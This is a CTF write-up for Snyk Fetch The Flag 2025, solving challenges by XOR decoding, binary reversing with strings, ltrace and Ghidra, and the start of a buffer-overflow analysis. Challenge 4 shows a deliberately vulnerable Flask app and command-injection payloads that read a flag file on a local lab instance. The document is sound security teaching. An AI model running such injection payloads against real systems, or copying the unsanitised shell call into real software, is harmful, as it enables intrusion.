# Snyk Fetch The Flag 2025 CTF Writeup

Welcome to my **CTF Writeup** for the **Snyk Fetch The Flag 2025 CTF** competition. 

In this file, I’ll walk through the challenges I solved during the event, providing insights into the tools, techniques, and vulnerabilities I encountered and how I approached solving each problem.

---

![Certificate CTF](https://github.com/user-attachments/assets/1c8fbee4-89a3-43e8-8daa-477601376c07)


## Table of Contents
- [Challenge 1: Read The Rules](#challenge-1-read-the-rules)
- [Challenge 2: Technical Support](#challenge-2-technical-support)
- [Challenge 3: Zero Ex Six One](#challenge-3-zero-ex-six-one)
- [Challenge 4: CTF 101](#challenge-4-ctf-101)
- [Challenge 5: Science 100](#challenge-5-science-100)
- [Challenge 6: Screaming Crying Throwing Up](#challenge-6-screaming-crying-throwing-up)
- [Challenge 7: String Me Along](#challenge-7-string-me-along)
- [Challenge 8: A Powerful Shell](#challenge-8-a-powerful-shell)
- [Challenge 9: An Offset Amongst Friends](#challenge-9-an-offset-amongst-friends)
- [Challenge 10: Either Or](#challenge-10-either-or)
- [Challenge 11: Math For Me](#challenge-11-math-for-me)
- [Challenge 12: Letter2nums](#challenge-12-letter2nums)
- [Challenge 13: Echo](#Challenge-13-Echo)
- [Challenge 14: Additional Information Needed](#Challenge-14-Additional-Information-Needed)
- [Conclusion](#conclusion)
---

## Challenge 1: Read The Rules

### Problem Description

Author: @JohnHammond

Please follow the rules for this CTF!

Connect here:
Read The Rules 
### Solution

To solve the read the rules challenge I viewed the source code of the page to find a flag in the HTML comments:
![[Pasted image 20250227105732.png]]

---

## Challenge 2: Technical Support

### Problem Description

Author: @JohnHammond

Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?

This CTF uses support tickets to help handle requests. If you need assistance, please create a ticket with the #open-help-ticket channel. You do not need to direct message any CTF organizers or facilitators, they will just tell you to open a ticket. You might find a flag in the ticket channel, though!

Connect here:
Join the Discord! 
### Solution

This was another freebie, where you join the Discord and view the channel for a flag:
![[Pasted image 20250227110144.png]]

---

## Challenge 3: Zero Ex Six One

### Problem Description

Author: @HuskyHacks

I'm XORta out of ideas for how to get the flag. Does this look like anything to you?
Attachments: flag.txt.encry
### Solution

We're given a text file that includes the following filetype and data:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# file flag.txt.encry                     
flag.txt.encry: ASCII text, with CRLF line terminators

┌──(root㉿kali)-[/home/kali/SNYK]
└─# cat flag.txt.encry 
0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c
```

Essentially we're looking at a hexadecimal content. The hint we receive from John says 'XOR' which means we are probably using the bitwise operator `^` in Python to decode the flag.

A python implementation to decrypt the hexed/XOR'd string:
```python
#!/usr/bin/env python3
import re # Using regular expressions (regex) for extracting 'flag{}' string

""" Python Script to Decode XOR Cipher for Zero Ex Six One Challenge """

# Text retrieved from 'flag.txt.encry' appearing as hexadecimal
encrypted_hex = "0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c"

# Remove "0x" and join hex values into a continuous string
cleaned_hex = encrypted_hex.replace("0x", "").replace(" ", "")

encrypted_bytes = bytes.fromhex(cleaned_hex)

# Trying different keys (assuming a single-byte XOR key), essentially brute-forcing:
for key in range(256):
    decrypted = bytes([b ^ key for b in encrypted_bytes]) # XOR'ing with current key to produce new decrypted byte sequence
    try:
        text = decrypted.decode("utf-8")
        if all(32 <= c < 127 or c == 10 for c in decrypted):  # Filter for readable ASCII
            print(f"Key: {hex(key)} | Decrypted: {text}")
            
            # Extract the flag if it exists
            match = re.search(r'flag\{.*?\}', text)
            if match:
                print(f"\n[+] Flag found: {match.group(0)}\n")
                break  # Stop searching once the flag is found

    except UnicodeDecodeError:
        pass  # Ignore decoding errors
```

See the output of the Python program for the flag:
![[Pasted image 20250227124113.png]]

This script attempts **every possible XOR key** (0-255) and checks if the decryption produces **a readable ASCII message**. If it finds a string containing **"flag{}"**, it extracts and prints it.

If you're working on a **CTF (Capture The Flag) challenge**, this is a great way to **brute-force** XOR-encrypted data and automatically **grab the flag**.

---

## Challenge 4: CTF 101

### Problem Description

Author: @HuskyHacks

If you are new to CTFs, start here!
Welcome to the CTF 101 challenge for the Snyk Fetch the Flag 2025 CTF! This challenge serves as an introduction to familiarize players with how the game works. It presents players with a simple challenge that emulates the challenges they will see on game day.
Hopefully after you've completed this challenge, you'll be able to say that game day is "just like the simulations!"

The challenge source code is available in the challenge.zip folder. The password is snyk-ftf-2025. Please read the README inside the zip file to get a full tutorial on how to play the CTF!

Use the Dockerfile to run a local instance of the challenge! To build and the container, unzip the contents of the challenge.zip file and run:
docker build -t [challenge_name] . && docker run -it -p 5000:5000 [challenge_name]

Press the Start button on the top-right to begin this challenge.
Attachments: challenge.zip
### Solution

**Step 1: Download and Extract the Challenge Files**

Each challenge provides a ZIP file containing the source code and Docker setup. The password for all challenge ZIP files is:
```bash
snyk-ftf-2025
```

 **Commands to Extract the Challenge Files:**
```bash
unzip challenge.zip -d ctf101
cd ctf101
```

This will create a directory (`ctf101/`) and extract the files into it.

 **Step 2: Analyze the Source Code**

Inside the extracted folder, there is a Python web application. The key file to inspect is:
```bash
cat app.py
```

```python
from flask import Flask, render_template, request, redirect, flash
import subprocess

app = Flask(__name__)
app.secret_key = "supersecretkey"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        name = request.form.get("name", "").strip()

        if not name:
            flash("Error: Name cannot be empty.", "error")
            return redirect("/")

        try:
            # I sure hope no one tries to run any commands by injecting here...
            output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
            flash(f"Hello, {output.strip()}! Good luck!", "success")
            # ...alright, the challenges won't be this obvious on game day, but I hope it gives you a good idea of how the game is played!
        except subprocess.CalledProcessError as e:
            flash(f"Error: {e.output.strip()}", "error")

        return redirect("/")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

**Identified Vulnerability: OS Command Injection**

The following code snippet in `app.py` shows that user input is passed directly into a shell command without proper sanitization:
```python
output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
```

- The `subprocess.check_output()` function runs a shell command.
- **User input (`name`) is directly inserted into the shell command**, making it vulnerable to OS command injection.

 **Step 3: Deploy the Web Application Locally**

To test the vulnerability, we need to **build and run the application** using Docker.

**Build the Docker Container From INSIDE 'CTF101' Directory**
```bash
docker build -t ctf101 .
```

**Run the Container**
```bash
docker run -it -p 5000:5000 ctf101
```

Now, the application should be accessible at:
```bash
http://localhost:5000
```

 **Step 4: Exploit the Vulnerability**

**Testing for Command Injection**

Since the application takes user input and passes it directly to `echo`, we can **inject a shell command** using command separators like `;` or `&&`:
```bash
name=hello; ls
```

![[Pasted image 20250227125249.png]]

**Notice the listing of files in the current working directory.**

**Finding the Flag**

From the **Dockerfile**, we know the flag is in `/app/flag.txt`:
```dockerfile
COPY flag.txt /app/flag.txt
```

To read it, enter this payload in the form:
```bash
hello; cat /app/flag.txt
```

![[Pasted image 20250227133203.png]]

This should print the flag to the webpage on the WEBSITE spawned instance.

---

## Challenge 5: Science 100

### Problem Description

Author: @HuskyHacks

Patrolling the Mojave almost makes you wish for a nuclear winter.

Press the Start button on the top-right to begin this challenge.
Connect with: `nc challenge.ctf.games 30739`

### Solution

Connecting to the remote endpoint shows us a very Fallout-esque looking terminal:
![[Pasted image 20250227133316.png]]

When you input words to the screen as if you were 'hacking' in Fallout we're either decreasing our chances or we will receive the flag, see here for the flag:
![[Pasted image 20250227133802.png]]

---

## Challenge 6: Screaming Crying Throwing Up

### Problem Description

Author: @Kkevsterrr

Or some xkcd cipher like that.
Attachments: screaming.bin
### Solution

Examining the filetype and data inside returns:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# file screaming.bin 
screaming.bin: Unicode text, UTF-8 text, with no line terminators
                                                                                                                 
┌──(root㉿kali)-[/home/kali/SNYK]
└─# cat screaming.bin 
a̮ăaa̋{áa̲aȧa̮ȧaa̮áa̲a̧ȧȧa̮ȧaa̲a̧aa̮ȧa̲aáa̮a̲aa̲a̮aaa̧}
```

The data is really weird. Looking at the problem description we notice `xkcd` cipher. We can research that to find out that a 'scream cipher' exists and is relating to this scenario.

A table from the website: https://www.explainxkcd.com/wiki/index.php/3054:_Scream_Cipher:
![[Pasted image 20250227141644.png]]

We can see the diacritics and manually convert the message or find a tool online:
![[Pasted image 20250227141617.png]]

We are specifically using this part of the table to decode the message and we automate the process using this online tool: https://frostbird347.bitbucket.io/db/scream.js/
![[Pasted image 20250227142101.png]]

The message decoded:
![[Pasted image 20250227142642.png]]

The message is:
```bash
flag{EDABFBAFEDCBBFBADCAFBDAEFDADFAAC}
```

Python implementation to create a lowercase flag:
```python
#!/usr/bin/env python3

text = "FLAG{EDABFBAFEDCBBFBADCAFBDAEFDADFAAC}"
lowercase_text = text.lower()
print(lowercase_text)
```

---

## Challenge 7: String Me Along

### Problem Description

Author: @Kkevsterrr

String me right along!

Download the file(s) below.
Attachments: string-me-along
### Solution

Running the strings utility on the file will return this to us:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# strings string-me-along       
/lib64/ld-linux-x86-64.so.2
puts
__stack_chk_fail
__libc_start_main
__cxa_finalize
printf
__isoc99_scanf
strcmp
libc.so.6
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
flag{850H
de1a29abH
50b6e5adH
958334b6H
68d5bf}
Welcome to the first RE challenge!
Enter the password: 
unlock_me_123
Correct! Here's your flag: %s
Wrong password! Try again.
9*3$"
...
```

You will notice the flag is inside, among the functions, where it is split up.

We can use regex and Python to return just the flag to us with this Python implementation:
```python
#!/usr/bin/env python3

import re  # Import the 're' module for regular expressions

# Open the file in binary mode ('rb' means read binary)
with open('string-me-along', 'rb') as file:
    content = file.read()  # Read the entire content of the file into 'content'

# Decode the binary content to UTF-8, ignoring any errors during decoding
content = content.decode('utf-8', errors='ignore')

# Use regex to find all occurrences of the flag pattern in the content
# The pattern 'flag{[^}]*}' matches any string starting with 'flag{' and ending with '}',
# including everything inside the curly braces (except '}' itself).
flag_pattern = re.findall(r'flag{[^}]*}', content)

# Join the list of flags found into a single string (in case there are multiple flags)
flag = ''.join(flag_pattern)

# Print the resulting flag string
print(flag)
```

Output:
```bash
flag{850Hde1a29abHEHUH50b6e5adH958334b6HEHUH68d5bf}
```

This did not end up working for me and I had to look deeper into the situation. Where I find out this is an ELF 64-bit executable:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# file string-me-along   
string-me-along: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=385f92663792bbd45e37120a88ef269586cf5ffb, for GNU/Linux 3.2.0, not stripped
```

We did see that we had instructions in plain-text of what the file is expecting though.

We can compile it:
```
chmod +x string-me-along
```

After doing so we can actually interact with this:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# ./string-me-along 
Welcome to the first RE challenge!
Enter the password: 
```

We can use the password we saw earlier (`unlock_me_123`):
![[Pasted image 20250227141412.png]]

I was able to get the correct flag by re-using the password in the strings command output:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# ./string-me-along 
Welcome to the first RE challenge!
Enter the password: unlock_me_123
Correct! Here's your flag: flag{850de1a29ab50b6e5ad958334b68d5bf}
```

---

## Challenge 8: A Powerful Shell

### Problem Description

Author: @Kkevsterrr

How can a SHELL have so much POWER?!

Download the file(s) below.
Attachments: challenge.ps1

### Solution

This is the contents of challenge.ps1:
![[Pasted image 20250227142932.png]]

We can run the encoded variable content through `echo "" | base64 -d` to see what it reveals.

I ran it again on the output as we find a second encoded string (the plaintext code above kind of insinuates this) and we get the flag:
![[Pasted image 20250227143159.png]]

---

## Challenge 9: An Offset Amongst Friends

### Problem Description

Author: @Kkevsterrr

What's a little offset amongst friends?

Download the file(s) below.
Attachments: an-offset

### Solution

The file type is an executable ELF 64-bit executable:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# file an-offset      
an-offset: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8b1dfc5eed72cf63d51137fc6381eb54723e71c8, for GNU/Linux 3.2.0, stripped
```

This one with strings ran against it is not as obvious:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# strings an-offset      
/lib64/ld-linux-x86-64.so.2
Tr>q
puts
__stack_chk_fail
__libc_start_main
__cxa_finalize
printf
__isoc99_scanf
strcmp
libc.so.6
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
gmbh|d65H
42659364H
2d22b87bH
fbb939f5H
54918d~
vompdl`nH
`nf`234
Enter the password: 
Correct! Here's your flag: %s
Wrong password! Try again.
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

**Key Information from `strings`:**
1. **Libraries and Functions**: The output lists standard libraries like `libc.so.6` and functions such as `puts`, `printf`, `strcmp`, `__stack_chk_fail`, etc. These are common in C programs and indicate that the binary interacts with the system's standard libraries and may have certain security mechanisms (like stack protection).
2. **Password Prompt**: The string `Enter the password:` suggests that the program requires a password to proceed.
3. **Flag Message**: The string `Correct! Here's your flag: %s` shows that, upon providing the correct password, the program will print a flag.
4. **GCC and GLIBC**: The binary is compiled with GCC 13.3.0 and links against GLIBC 2.7 or newer. This can inform us about potential exploitation techniques, especially for buffer overflows or format string vulnerabilities.

We can make the file executable with:
```bash
chmod +x an-offset
```

We need a password:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# ./an-offset 
Enter the password: 
```

**Time for reverse engineering:**

The first thing I did was run LTRACE against the binary to attempt to add an input of 'test' and see what it returns with to potentially get a password.

We are able to get a password because of the insecure `strcmp` function inside of the program:
![[Pasted image 20250227143834.png]]

We retrieve the flag using the password:
![[Pasted image 20250227143920.png]]

**Why This Worked:**
1. **Using `ltrace`**:
    - `ltrace` traces function calls, allowing you to see the internal workings of the program.
2. **Revealing the Password Check**:
    - The program uses `strcmp` to compare user input with a hardcoded password (`unlock_me_123`).
    - With `ltrace`, you observed this comparison and learned the correct password.
3. **Bypassing the Check**:
    - Once you knew the correct password, entering it revealed the flag: `flag{c54315482531c11a76aeaa828e43807c}`.

What if this did not work?

If using `ltrace` didn't work or didn't reveal the password, here are some other directions we could have taken:

### 1. **Static Analysis (using `strings`, `objdump`, or `gdb`)**

- **`strings`**: Searching for human-readable strings within the binary might reveal embedded hints, error messages, or even the hardcoded password directly.
- **`objdump`**: Disassembling the binary with `objdump` can help you inspect the assembly code. You could search for the function handling the password verification or look for comparisons with strings.
- **`gdb`**: Using a debugger like `gdb` would allow you to step through the program's execution to analyze how the password is being checked in real-time. You can set breakpoints to pause execution and inspect memory, variables, or function calls.

### 2. **Dynamic Analysis (debugging with `gdb` or `strace`)**

- If `ltrace` didn’t provide enough information, **`strace`** can show system calls made by the program (e.g., `read`, `write`, or memory allocation), helping to analyze how the program processes input and where the password might be checked.
- Debugging with **`gdb`** would let you analyze the flow of execution in detail and could expose the password check function directly, or you could examine the stack to inspect password-related variables.

### 3. **Reverse Engineering with Disassemblers**

- Tools like **IDA Pro** or **Radare2** provide more advanced reverse engineering capabilities. These tools allow you to disassemble the binary and analyze it at a higher level, making it easier to find the logic behind the password comparison, even if it’s obfuscated.

### 4. **Looking for Other Input Validation Flaws**

- Sometimes, binaries may contain other weaknesses, such as improper input sanitization or buffer overflows. In those cases, exploring potential vulnerabilities that could allow bypassing the password check or leaking the flag would be necessary.

### 5. **Fuzzing**

- If all else fails, you might consider fuzzing the binary. Fuzzing involves sending a large volume of random or semi-random inputs to the program to see if you can trigger unexpected behavior (e.g., memory leaks or crashes). This might give you insights into how the binary handles input and whether it can be exploited in some way.

In essence, without `ltrace` revealing the password check directly, **static and dynamic analysis tools** would be your next step in trying to reverse engineer the binary.

---

## Challenge 10: Either Or

### Problem Description

Author: @Kkevsterrr

Either or, but probably not both

Download the file(s) below.
Attachments: either-or

### Solution

Running strings on the binary shows that it takes an input and performs encryption before comparing to another string. Running the binary we're able to see what goes wrong.

We can also see the insecure STRCMP function being used:

![image](https://github.com/user-attachments/assets/fadb0a8c-75e5-4328-86cb-97f76e7fb161)


As we test inputs against the program and use what the program returns to use when we examine what inputs it is comparing we can find the "secret_password" to reveal the flag:

![image](https://github.com/user-attachments/assets/adcde494-1e7c-41ac-8140-93f1c4e9d7b0)


```bash
Flag: flag{f074d38932164b278a508df11b5eff89}
```

---

## Challenge 11: Math For Me

### Problem Description

Author: @Kkevsterrr

Just gotta do some math! 

This flag is a non-standard format. It will be wrapped in flag{ prefix and } suffix
but inside the curly braces will be any printable characters, not be just hexadecimal characters. 

Download the file(s) below.
Attachments: math4me

### Solution

Running GHIDRA to decompile the binary and examine the functions in the program and defined strings which are helpful in identifying high-value information:

![image](https://github.com/user-attachments/assets/54e64609-8407-43c9-806d-3e523061b748)


From this window we're able to find a `check_number` string and `computer_flag` string.

We're able to find a function named check_number():

![image](https://github.com/user-attachments/assets/0e3e5f67-a8a6-494f-bb4c-d5ed690dc48c)


In the decompile window we're able to view the de-obfuscated functionality and see the math equation taking place (`0x34` is 52 in hexadecimal):

![image](https://github.com/user-attachments/assets/1d4b6401-a484-45cb-b38e-580df08ae3ae)

We can decompile a `compute_flag_char()` function also to see how the flag is being computed:
```c
void compute_flag_char(long param_1,uint param_2,int param_3)  
  
{  
uint uVar1;  
long in_FS_OFFSET;  
int local_a8 [4];  
undefined4 local_98;  
undefined4 local_94;  
undefined4 local_90;  
undefined4 local_8c;  
undefined4 local_88;  
undefined4 local_84;  
undefined4 local_80;  
undefined4 local_7c;  
undefined4 local_78;  
undefined4 local_74;  
undefined4 local_70;  
undefined4 local_6c;  
undefined4 local_68;  
undefined4 local_64;  
undefined4 local_60;  
undefined8 local_58;  
undefined8 local_50;  
undefined8 local_48;  
undefined8 local_40;  
undefined8 local_38;  
undefined7 local_30;  
undefined uStack_29;  
undefined7 uStack_28;  
undefined8 local_21;  
long local_10;  
  
local_10 = *(long *)(in_FS_OFFSET + 0x28);  
local_58 = 0x3438666532353535;  
local_50 = 0x6562396261636532;  
local_48 = 0x3636333535316231;  
local_40 = 0x3535353535383335;  
local_38 = 0x3234386665323535;  
local_30 = 0x65623962616365;  
uStack_29 = 0x31;  
uStack_28 = 0x36363335353162;  
local_21 = 0x35353535383335;  
local_a8[0] = 1;  
local_a8[1] = 3;  
local_a8[2] = 0xfffffffe;  
local_a8[3] = 4;  
local_98 = 0xffffffff;  
local_94 = 2;  
local_90 = 0xfffffffd;  
local_8c = 1;  
local_88 = 4;  
local_84 = 0xfffffffe;  
local_80 = 3;  
local_7c = 0xffffffff;  
local_78 = 2;  
local_74 = 0xfffffffc;  
local_70 = 1;  
local_6c = 0xfffffffe;  
local_68 = 3;  
local_64 = 0xffffffff;  
local_60 = 2;  
uVar1 = local_a8[(int)param_2 % 10] + (int)(param_3 * param_2) % 5;  
printf("%d: %d\n",(ulong)param_2,(ulong)uVar1);  
*(char *)(param_1 + (int)param_2) = *(char *)((long)&local_58 + (long)(int)param_2) + (char)uVar1;  
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
/* WARNING: Subroutine does not return */  
__stack_chk_fail();  
}  
return;  
}
```

In order to get the right number we can reverse the check_number equation:
![image](https://github.com/user-attachments/assets/575b3ff6-ccd5-440f-aec3-58e5c46f29c3)


Then we're able to obtain the flag:

![image](https://github.com/user-attachments/assets/d2594ef2-3b7d-4ae8-b374-02f624f78bda)


```
flag{h556cdd`=ag.c53664:45569368391gc}
```

---

## Challenge 12: Letter2nums

### Problem Description

Author: @Soups71

This is Letters2Nums, a new data encryption
format I came up with. Use the attached binary to figure out how to decrypt the
encoded flag.

Download the file(s) below.
Attachments: letters2nums.elf and ecflag.txt

### Solution

This challenge uses encoding to turn the original flag into a list of numbers here:
```bash
┌──(root㉿kali)-[/home/kali/STATIC-SNYK/Snyk Fetch the Flag 2025 BACKUP PLAN/letters2nums]
└─# cat encflag.txt  
21608
26995
8297
29472
24864
27759
28263
8289
28260
8291
28526
30319
27765
25701
25632
30561
31008
29807
8308
29305
8289
28260
8296
26980
25888
29800
25888
26220
24935
14950
27745
26491
13154
12341
12390
13665
14129
13925
13617
25400
14693
14643
12851
25185
26163
24887
25143
13154
32000
```

Running strings against the binary without the protections to obfuscate function names, we can see (a heavily modified output of strings from me) that raises attention to some function names:
```bash
┌──(root㉿kali)-[/home/kali/STATIC-SNYK/Snyk Fetch the Flag 2025 BACKUP PLAN/letters2nums]
└─# strings letters2nums.elf      
fgets
fprintf
fopen
fclose
puts
Error opening file.
This is a long and convoluded way to try and hide the flag:
flag.txt
encflag.txt
encodeChars
writeFlag
```

Opening GHIDRA against the file (which does not run in the command line), we can see a number of non-standard function names in the strings window and look at Main where its running the main functionalities of the program to call on other places:
```bash
readFlag
WriteFlag
sl
c
```

 **Main Function:**
- Reads up to 39 bytes from `flag.txt` into `flag_buffer`.
- Concatenates a prefix (`"This is a long and convoluted way to try and hide the flag:"`) with the flag into `encrypted_flag`.
- Writes `encrypted_flag` to `encflag.txt` using `writeFlag`.

```c
undefined8 main(void)  
  
{  
long in_FS_OFFSET;  
undefined flag_buffer [48];  
undefined encrypted_flag [264];  
long stack_cookie;  
  
stack_cookie = *(long *)(in_FS_OFFSET + 0x28);  
readFlag("flag.txt",flag_buffer);  
c("This is a long and convoluded way to try and hide the flag:",flag_buffer);  
writeFlag("encflag.txt",encrypted_flag);  
if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {  
/* WARNING: Subroutine does not return */  
__stack_chk_fail();  
}  
return 0;  
}
```

 **readFlag:**
- Reads up to 39 bytes from `flag.txt` into `flag_buffer`.

```c
undefined8 readFlag(char *param_1,char *param_2)  
  
{  
FILE *__stream;  
  
__stream = fopen(param_1,"r");  
fgets(param_2,0x27,__stream);  
return 0;  
}
```

**writeFlag:**
- Opens `encflag.txt`, calculates `encrypted_flag` length via `sl()`.
- Encodes each character pair using `encodeChars()` and writes results (one per line).

```c
undefined8 writeFlag(char *param_1,long param_2)  
  
{  
short sVar1;  
int iVar2;  
FILE *__stream;  
int local_18;  
  
__stream = fopen(param_1,"w");  
iVar2 = sl(param_2,0);  
if (__stream == (FILE *)0x0) {  
puts("Error opening file.");  
}  
else {  
for (local_18 = 0; local_18 < iVar2; local_18 = local_18 + 2) {  
sVar1 = encodeChars((int)*(char *)(param_2 + local_18),  
(int)*(char *)(param_2 + (long)local_18 + 1));  
fprintf(__stream,"%d\n",(ulong)(uint)(int)sVar1);  
}  
fclose(__stream);  
}  
return 0;  
}
```

 **sl (String Length):**
- Recursively computes `encrypted_flag` length for `writeFlag`.

```c
ulong sl(char *param_1,uint param_2)  
  
{  
ulong uVar1;  
  
if (*param_1 == '\0') {  
uVar1 = (ulong)param_2;  
}  
else {  
uVar1 = sl(param_1 + 1,param_2 + 1);  
}  
return uVar1;  
}
```

 **c (Concatenation):**
- Joins the prefix and flag into `encrypted_flag`.

```c
int c(void *param_1,void *param_2)  
  
{  
long in_RDX;  
char *local_28;  
char *local_20;  
int i;  
  
i = 0;  
local_20 = (char *)param_1;  
while (local_28 = (char *)param_2, *local_20 != '\0') {  
*(char *)(in_RDX + i) = *local_20;  
local_20 = local_20 + 1;  
i = i + 1;  
}  
while (*local_28 != '\0') {  
*(char *)(in_RDX + i) = *local_28;  
local_28 = local_28 + 1;  
i = i + 1;  
}  
*(undefined *)(in_RDX + i) = 0;  
return (int)(undefined *)(in_RDX + i);  
}
```

**The encodeChars function**:

- Takes two characters (`param_1` and `param_2`) and combines them into a 16-bit integer:
- `param_1` << 8: Shifts the first character’s ASCII value 8 bits left (high byte).
- (short)`param_2`: Takes the second character’s ASCII value (low byte).
- CONCAT22(param_1 >> 7, (short)param_2) seems to be a decompiler artifact; the actual operation is ((int)param_1 << 8) | (int)param_2 (bitwise OR).
- Returns an unsigned integer (e.g., for ‘a’ and ‘b’, it’s (97 << 8) | 98 = 24930).

```c
uint encodeChars(char param_1,char param_2)

{
  return CONCAT22(param_1 >> 7,(short)param_2) | (int)param_1 << 8;
}
```

`encodeChars()` combines two characters into a number:
- High byte = (number >> 8) & 0xFF
- Low byte = number & 0xFF
- Each number is decoded into two ASCII characters.

Script to solve the challenge:
```python
#!/usr/bin/env python3

nums = [21608, 26995, 8297, 29472, 24864, 27759, 28263, 8289, 28260, 8291, 28526, 30319, 27765, 25701, 25632, 30561, 31008, 29807, 8308, 29305, 8289, 28260, 8296, 26980, 25888, 29800, 25888, 26220, 24935, 14950, 27745, 26491, 13154, 12341, 12390, 13665, 14129, 13925, 13617, 25400, 14693, 14643, 12851, 25185, 26163, 24887, 25143, 13154, 32000]  
result = ""  
for num in nums:  
char1 = chr((num >> 8) & 0xFF)  
char2 = chr(num & 0xFF)  
result += char1 + char2  
print(result)
```

This will return the flag to us:
```bash
flag{3b050f5a716e51c89e9323baf3a7b73b}
```

## Challenge 13: Echo

I have attached this static binary in the GitHub repo main area.
### Problem Description

Author: @awesome10billion

I made my own echo program. my own echo program.

Download the file(s) below.
Attachments: echo

### Solution

Checking the file reveals it is an ELF binary:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# file echo
echo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba71fb7825c88b04e13afe6dcc11ba9113394f12, for GNU/Linux 3.2.0, not stripped
```

Running checksec against the binary tells us there is no protections in-place:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# pwn checksec echo
[*] '/home/kali/SNYK/echo'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

I attempted to run the program with a TON of input to see if I would hit a segmentation fault, which it does, and this tells us that a buffer overflow is present:
```bash
┌──(root㉿kali)-[/home/kali/SNYK]
└─# ./echo 
Give me some text and I'll echo it back to you: 
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
zsh: segmentation fault  ./echo
```

We can open the binary with GHIDRA to see its source code- get a look at the functions:

![image](https://github.com/user-attachments/assets/627e3862-19ed-486e-8c43-522485b6b458)


This is not a very big program and the non-standard naming conventions of the functions may reveal some of the functionality within.

Main function:
```c
undefined8 main(EVP_PKEY_CTX *param_1)  
  
{  
char local_88 [128];  
  
init(param_1);  
puts("Give me some text and I\'ll echo it back to you: ");  
gets(local_88);  
puts(local_88);  
return 0;  
}
```

The win function:
```c
void win(void)  
  
{  
int iVar1;  
FILE *__stream;  
char local_11;  
  
__stream = fopen("flag.txt","r");  
if (__stream != (FILE *)0x0) goto LAB_0040126a;  
puts("Please create \'flag.txt\' in this directory with your own debugging flag.");  
FUN_00401120(0);  
do {  
putchar((int)local_11);  
LAB_0040126a:  
iVar1 = fgetc(__stream);  
local_11 = (char)iVar1;  
} while (local_11 != -1);  
fclose(__stream);  
return;  
}
```

This is a Ret2Win challenge: where you exploit a buffer overflow vulnerability to gain control over the program's execution flow. The goal is to overwrite the return address on the stack so that when the function returns, it jumps to the `win()` function (or a similar function that provides access to the flag or other sensitive data).

First we need to calculate the offset. You can use `pwndbg` for that.

**pwndbg** is a **GDB** (GNU Debugger) plugin designed to enhance the debugging experience for security researchers and reverse engineers, especially in the context of exploiting binaries. It provides a variety of additional features that simplify and speed up tasks like analyzing buffer overflows, reverse engineering, and performing exploits.

Installation instructions (pwndbg is typically installed via GitHub and integrated directly into GDB):
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

